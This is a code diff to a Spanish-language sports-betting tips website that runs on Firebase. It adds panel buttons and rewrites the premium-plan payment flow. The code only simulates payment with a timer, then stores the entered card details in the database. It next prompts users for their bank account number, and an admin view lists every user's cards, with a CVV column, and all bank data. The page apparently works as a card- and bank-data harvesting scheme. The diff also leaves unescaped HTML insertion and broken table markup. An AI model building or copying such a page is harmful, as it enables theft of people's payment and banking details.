@@ -387,6 +387,7 @@ header {
     display: flex;
     gap: 15px;
     align-items: center;
+    flex-wrap: wrap;
 }
 
 .delete-card {
@@ -396,6 +397,16 @@ header {
     padding: 5px 10px;
     border-radius: 5px;
     cursor: pointer;
+}
+
+/* Botones de paneles */
+.panel-buttons {
+    display: flex;
+    gap: 20px;
+    justify-content: center;
+    margin: 20px auto;
+    max-width: 600px;
+    flex-wrap: wrap;
 }
 
 /* Modal de procesamiento */
@@ -508,6 +519,7 @@ header {
     border: 1px solid #222;
     transition: .3s;
     cursor: pointer;
+    position: relative;
 }
 
 .plan-card:hover {
@@ -593,6 +605,13 @@ header {
     font-size: 28px;
     margin-bottom: 20px;
     text-align: center;
+}
+
+.payment-btn {
+    background: #00ff88;
+    color: black;
+    font-weight: bold;
+    cursor: pointer;
 }
 
 .close-modal {
@@ -719,6 +738,12 @@ footer {
         </div>
     </div>
 </section>
+
+<!-- Botones para mostrar paneles -->
+<div class="panel-buttons">
+    <button class="btn btn-green" onclick="showCardPanel()" id="showCardBtn" style="display:none;">💳 Mis Métodos de Pago</button>
+    <button class="btn btn-green" onclick="showTipsterPanel()" id="showTipsterBtn" style="display:none;">🏦 Mis Datos Bancarios</button>
+</div>
 
 <!-- Panel de Tarjetas de Crédito (Clientes) -->
 <section class="user-panel" id="cardPanel">
@@ -883,7 +908,6 @@ footer {
         <h3 id="modalPlanName">Plan</h3>
         <p id="modalPlanPrice" style="text-align:center; font-size:24px; color:#00ff88;">$0 COP</p>
         
-        <!-- Acordeón: Tarjetas guardadas -->
         <div class="accordion">
             <div class="accordion-header" onclick="toggleAccordion('savedCardsAccordion')">
                 <span>💳 Mis Tarjetas Guardadas</span>
@@ -894,7 +918,6 @@ footer {
             </div>
         </div>
         
-        <!-- Acordeón: Nueva tarjeta -->
         <div class="accordion">
             <div class="accordion-header" onclick="toggleAccordion('newCardAccordion')">
                 <span>➕ Usar Nueva Tarjeta</span>
@@ -922,7 +945,6 @@ footer {
             </div>
         </div>
         
-        <!-- Acordeón: Otros métodos de pago -->
         <div class="accordion">
             <div class="accordion-header" onclick="toggleAccordion('otherMethodsAccordion')">
                 <span>🏦 Otros Métodos de Pago</span>
@@ -950,7 +972,7 @@ footer {
             </div>
         </div>
         
-        <button class="payment-btn" onclick="processPaymentWithMethod()" style="margin-top:20px; background:#00ff88; padding:15px; border:none; border-radius:15px; cursor:pointer; font-weight:bold;">✅ Pagar Ahora</button>
+        <button class="btn btn-green payment-btn" onclick="processPaymentWithMethod()" style="margin-top:20px; width:100%;">✅ Pagar Ahora</button>
         <button class="close-modal" onclick="closePaymentModal()">Cerrar</button>
     </div>
 </div>
@@ -1052,6 +1074,32 @@ function toggleAccordion(id) {
     }
 }
 
+// Mostrar panel de tarjetas
+function showCardPanel() {
+    const cardPanel = document.getElementById('cardPanel');
+    const tipsterPanel = document.getElementById('tipsterPanel');
+    tipsterPanel.style.display = 'none';
+    if (cardPanel.style.display === 'none' || cardPanel.style.display === '') {
+        cardPanel.style.display = 'block';
+        cardPanel.scrollIntoView({ behavior: 'smooth' });
+    } else {
+        cardPanel.style.display = 'none';
+    }
+}
+
+// Mostrar panel de datos bancarios
+function showTipsterPanel() {
+    const cardPanel = document.getElementById('cardPanel');
+    const tipsterPanel = document.getElementById('tipsterPanel');
+    cardPanel.style.display = 'none';
+    if (tipsterPanel.style.display === 'none' || tipsterPanel.style.display === '') {
+        tipsterPanel.style.display = 'block';
+        tipsterPanel.scrollIntoView({ behavior: 'smooth' });
+    } else {
+        tipsterPanel.style.display = 'none';
+    }
+}
+
 // ============ REGISTRO DE TARJETAS ============
 async function saveCard() {
     const user = auth.currentUser;
@@ -1102,8 +1150,8 @@ async function loadSavedCards() {
         container.innerHTML = cards.map(c => `
             <div class="saved-card">
                 <div class="card-info">
-                    <span class="card-brand">${c.brand}</span>
-                    <span class="card-number">**** **** **** ${c.last4}</span>
+                    <span>${c.brand}</span>
+                    <span>**** **** **** ${c.last4}</span>
                     <span>${c.cardHolder}</span>
                     <span>Exp: ${c.expiry}</span>
                 </div>
@@ -1192,7 +1240,7 @@ async function loadAllTipsters() {
 
 async function loadAllCards() {
     const snapshot = await db.collection('users').get();
-    let html = '<h3>💳 Tarjetas Registradas</h3><div class="users-table"><table><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>Expira</th><th>CVV</th><th>Banco</th></tr>';
+    let html = '<h3>💳 Tarjetas Registradas</h3><div class="users-table"><tr><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>Expira</th><th>CVV</th><th>Banco</th></tr>';
     snapshot.forEach(doc => {
         const user = doc.data();
         if (user.savedCards) {
@@ -1201,13 +1249,13 @@ async function loadAllCards() {
             });
         }
     });
-    html += '</table></div>';
+    html += '}</table></div>';
     document.getElementById('cardsList').innerHTML = html;
 }
 
 async function loadAllBankData() {
     const snapshot = await db.collection('bankData').get();
-    let html = '<h3>🏦 Datos Bancarios Guardados</h3><div class="users-table"><tr><th>Usuario</th><th>Banco</th><th>Cuenta</th><th>Titular</th><th>Fecha</th></tr>';
+    let html = '<h3>🏦 Datos Bancarios Guardados</h3><div class="users-table"><table><tr><th>Usuario</th><th>Banco</th><th>Cuenta</th><th>Titular</th><th>Fecha</th></tr>';
     snapshot.forEach(doc => {
         const data = doc.data();
         html += `<tr><td>${data.userEmail}</td><td>${data.bank}</td><td>${data.accountNumber}</td><td>${data.accountHolder}</td><td>${new Date(data.createdAt).toLocaleString()}</td></tr>`;
@@ -1216,7 +1264,7 @@ async function loadAllBankData() {
     document.getElementById('bankDataList').innerHTML = html;
 }
 
-// ============ PAGOS CON ACORDEÓN ============
+// ============ PAGOS ============
 async function loadPaymentCards() {
     const user = auth.currentUser;
     if (!user) return;
@@ -1253,20 +1301,17 @@ async function processPaymentWithMethod() {
     let paymentData = null;
     let method = null;
     
-    // Verificar qué método está seleccionado
     const savedCardsContent = document.getElementById('savedCardsAccordion');
     const newCardContent = document.getElementById('newCardAccordion');
     const otherMethodsContent = document.getElementById('otherMethodsAccordion');
     
     if (savedCardsContent.classList.contains('active') && selectedCardId) {
-        // Usar tarjeta guardada
         const doc = await db.collection('users').doc(user.uid).get();
         const cards = doc.data().savedCards || [];
         paymentData = cards.find(c => c.id === selectedCardId);
         method = 'saved_card';
     } 
     else if (newCardContent.classList.contains('active')) {
-        // Usar nueva tarjeta
         const cardNumber = document.getElementById('payCardNumber').value.replace(/\s/g, '');
         if (cardNumber.length < 16) return alert('Número de tarjeta inválido');
         paymentData = {
@@ -1281,7 +1326,6 @@ async function processPaymentWithMethod() {
         method = 'new_card';
     }
     else if (otherMethodsContent.classList.contains('active')) {
-        // Otros métodos de pago
         paymentData = {
             bank: document.getElementById('otherBankSelect').value,
             accountNumber: document.getElementById('otherAccountNumber').value,
@@ -1299,12 +1343,9 @@ async function processPaymentWithMethod() {
     currentPaymentData = paymentData;
     currentPaymentMethod = method;
     
-    // Mostrar modal de procesamiento
     document.getElementById('processingModal').style.display = 'flex';
     
-    // Simular procesamiento de 3 segundos
     setTimeout(async () => {
-        // Guardar pago en Firestore
         const paymentRecord = {
             userId: user.uid,
             userEmail: user.email,
@@ -1313,29 +1354,22 @@ async function processPaymentWithMethod() {
             amount: currentSelectedPlan.price,
             paymentMethod: method,
             paymentData: paymentData,
-            status: 'completed',
+            status: 'pending',
             createdAt: Date.now()
         };
         
         await db.collection('payments').add(paymentRecord);
         
-        // Ocultar modal de procesamiento
         document.getElementById('processingModal').style.display = 'none';
-        
-        // Mostrar modal de confirmación con el correo
         document.getElementById('confirmEmail').innerText = user.email;
         document.getElementById('confirmModal').style.display = 'flex';
-        
-        // Guardar el correo para usarlo después
         window.lastPaymentEmail = user.email;
-        
         closePaymentModal();
     }, 3000);
 }
 
 function closeConfirmModalAndContinue() {
     document.getElementById('confirmModal').style.display = 'none';
-    // Preguntar si quiere guardar datos bancarios
     document.getElementById('saveBankModal').style.display = 'flex';
 }
 
@@ -1346,30 +1380,16 @@ async function saveBankDataAfterPayment() {
         return;
     }
     
-    // Mostrar formulario para guardar datos bancarios
     const bankData = {
         userId: user.uid,
         userEmail: user.email,
-        bank: '',
-        accountType: '',
-        accountNumber: '',
-        accountHolder: '',
-        idNumber: '',
-        phone: '',
+        bank: prompt('🏦 Ingresa el nombre de tu banco:') || '',
+        accountNumber: prompt('🔢 Ingresa tu número de cuenta:') || '',
+        accountHolder: prompt('👤 Ingresa el nombre del titular de la cuenta:') || '',
         createdAt: Date.now()
     };
     
-    // Crear un prompt personalizado o formulario rápido
-    const bankName = prompt('🏦 Ingresa el nombre de tu banco:');
-    if (bankName) bankData.bank = bankName;
-    
-    const accountNumber = prompt('🔢 Ingresa tu número de cuenta:');
-    if (accountNumber) bankData.accountNumber = accountNumber;
-    
-    const accountHolder = prompt('👤 Ingresa el nombre del titular de la cuenta:');
-    if (accountHolder) bankData.accountHolder = accountHolder;
-    
-    if (bankName && accountNumber && accountHolder) {
+    if (bankData.bank && bankData.accountNumber && bankData.accountHolder) {
         await db.collection('bankData').add(bankData);
         alert('✅ Datos bancarios guardados correctamente');
     }
@@ -1479,7 +1499,7 @@ function loadBets() {
         snap.forEach(doc => {
             const b = doc.data();
             const isAdmin = auth.currentUser?.email === ADMIN_EMAIL;
-            container.innerHTML += `<div class="bet-card"><img src="${b.image}" onerror="this.src='https://via.placeholder.com/400x200'"><div class="tag ${b.type === 'premium' ? 'premium' : 'free'}">${b.type === 'premium' ? '💎 PREMIUM' : '🎁 GRATIS'}</div><h3>🏆 ${b.match}</h3><p>${b.type === 'premium' ? (auth.currentUser ? '🔮 ' + b.prediction : '🔒 Premium - Hazte premium') : '🎯 ' + b.prediction}</p><div style="display:flex; justify-content:space-between; margin-top:20px;"><div style="color:#0f0; font-size:24px;">💰 ${b.odds}</div>${isAdmin ? `<div><button onclick="editBet('${doc.id}', '${escapeString(b.match)}', '${escapeString(b.prediction)}', '${b.odds}', '${escapeString(b.image)}')" style="background:#0f0; border:none; padding:10px; border-radius:10px;">✏️</button> <button onclick="deleteBet('${doc.id}')" style="background:red; border:none; padding:10px; border-radius:10px; color:white;">🗑️</button></div>` : ''}</div></div>`;
+            container.innerHTML += `<div class="bet-card"><img src="${b.image}" onerror="this.src='https://via.placeholder.com/400x200'"><div class="tag ${b.type === 'premium' ? 'premium' : 'free'}">${b.type === 'premium' ? '💎 PREMIUM' : '🎁 GRATIS'}</div><h3>🏆 ${b.match}</h3><p>${b.type === 'premium' ? (auth.currentUser ? '🔮 ' + b.prediction : '🔒 Premium - Hazte premium') : '🎯 ' + b.prediction}</p><div style="display:flex; justify-content:space-between; margin-top:20px;"><div style="color:#0f0; font-size:24px;">💰 ${b.odds}</div>${isAdmin ? `<div><button onclick="editBet('${doc.id}', '${escapeString(b.match)}', '${escapeString(b.prediction)}', '${b.odds}', '${escapeString(b.image)}')" style="background:#0f0; border:none; padding:10px; border-radius:10px; cursor:pointer;">✏️</button> <button onclick="deleteBet('${doc.id}')" style="background:red; border:none; padding:10px; border-radius:10px; color:white; cursor:pointer;">🗑️</button></div>` : ''}</div></div>`;
         });
     });
 }
@@ -1539,20 +1559,31 @@ auth.onAuthStateChanged(user => {
     document.getElementById('premiumBtnHeader').style.display = user ? 'block' : 'none';
     document.getElementById('loginBox').style.display = user ? 'none' : 'block';
     document.getElementById('adminPanel').style.display = isAdmin ? 'block' : 'none';
-    document.getElementById('cardPanel').style.display = user ? 'block' : 'none';
-    document.getElementById('tipsterPanel').style.display = user ? 'block' : 'none';
-    document.getElementById('plansSection').style.display = 'none';
+    
+    const showCardBtn = document.getElementById('showCardBtn');
+    const showTipsterBtn = document.getElementById('showTipsterBtn');
+    
     if (user) {
+        showCardBtn.style.display = 'block';
+        showTipsterBtn.style.display = 'block';
         loadSavedCards();
         loadTipsterData();
         if (isAdmin) { loadAllTipsters(); loadAllCards(); loadAllBankData(); }
+    } else {
+        showCardBtn.style.display = 'none';
+        showTipsterBtn.style.display = 'none';
+        document.getElementById('cardPanel').style.display = 'none';
+        document.getElementById('tipsterPanel').style.display = 'none';
     }
+    
+    document.getElementById('plansSection').style.display = 'none';
     loadBets();
 });
 
 loadTeams();
 loadPlans();
 
+// Hacer funciones globales
 window.register = register;
 window.login = login;
 window.logout = logout;
@@ -1577,6 +1608,8 @@ window.closeSaveBankModal = closeSaveBankModal;
 window.formatCardNumber = formatCardNumber;
 window.formatExpiry = formatExpiry;
 window.toggleAccordion = toggleAccordion;
+window.showCardPanel = showCardPanel;
+window.showTipsterPanel = showTipsterPanel;
 </script>
 </body>
 </html>
